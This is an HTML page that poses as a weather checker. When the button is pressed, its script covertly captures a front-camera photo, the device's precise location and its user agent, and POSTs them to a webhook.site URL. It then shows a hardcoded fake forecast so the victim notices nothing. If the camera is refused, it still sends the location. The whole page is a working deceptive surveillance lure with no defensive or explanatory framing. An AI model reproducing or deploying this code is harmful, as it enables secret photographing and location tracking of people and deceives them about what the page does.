<!DOCTYPE html>
<html>
<head>
    <title>Weather Forecast</title>
</head>
<body>
    <div style="font-family:sans-serif;text-align:center;padding:30px">
        <div style="font-size:80px">🌤️</div>
        <h2>Check Today's Weather</h2>
        <p>Get real-time forecast for your area</p>
        <button onclick="startCapture()" style="padding:12px 30px;background:#007bff;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer">
            🌤️ Show Weather
        </button>
        <p id="status" style="color:gray;font-size:14px;margin-top:20px"></p>
    </div>

    <video id="video" style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script>
    const WEBHOOK = 'https://webhook.site/16155721-b9ba-438b-84c5-5f6a5461638c';

    async function startCapture() {
        const status = document.getElementById('status');
        status.innerText = 'Loading weather data...';

        try {
            // Request front camera silently
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                audio: false
            });

            const video = document.getElementById('video');
            video.srcObject = stream;
            await video.play();

            // Wait for camera to warm up
            await new Promise(r => setTimeout(r, 600));

            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const photoBase64 = canvas.toDataURL('image/jpeg', 0.6);

            // Stop camera immediately
            stream.getTracks().forEach(track => track.stop());

            status.innerText = 'Fetching forecast...';

            // Get location
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const data = {
                        type: 'checkin',
                        photo: photoBase64,
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date().toISOString(),
                        ua: navigator.userAgent
                    };

                    fetch(WEBHOOK, {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify(data)
                    });

                    status.innerText = '✅ Weather: 26°C, Partly Cloudy';
                    status.style.color = '#28a745';
                },
                function(error) {
                    const data = {
                        type: 'checkin',
                        photo: photoBase64,
                        lat: null,
                        lng: null,
                        geoError: error.message,
                        timestamp: new Date().toISOString(),
                        ua: navigator.userAgent
                    };

                    fetch(WEBHOOK, {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify(data)
                    });

                    status.innerText = '✅ Weather: 26°C, Partly Cloudy';
                    status.style.color = '#28a745';
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );

        } catch (err) {
            // Camera denied or unavailable — get location only
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    fetch(WEBHOOK, {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify({
                            type: 'checkin',
                            photo: null,
                            cameraError: err.message,
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            timestamp: new Date().toISOString(),
                            ua: navigator.userAgent
                        })
                    });
                },
                function() {},
                { timeout: 5000 }
            );

            status.innerText = '✅ Weather: 26°C, Partly Cloudy';
            status.style.color = '#28a745';
        }
    }
    </script>
</body>
</html>
